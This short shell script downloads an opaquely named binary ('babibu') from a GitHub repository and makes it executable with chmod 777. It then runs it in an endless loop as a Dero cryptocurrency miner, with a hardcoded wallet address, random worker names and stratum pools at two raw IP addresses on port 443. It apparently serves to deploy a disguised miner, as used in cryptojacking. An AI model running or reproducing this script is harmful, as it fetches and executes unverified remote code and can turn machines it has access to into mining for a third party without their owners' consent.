wget https://github.com/renilo/kuuntul/raw/main/babibu
chmod 777 babibu

while :; do
    ./babibu -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-2000 -n 1)-COK) -r 167.172.84.152:443 -p stratum;
    sleep 5;
    ./babibu -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-2000 -n 1)-COK) -r 170.187.197.220:443 -p stratum;
    sleep 5;
done
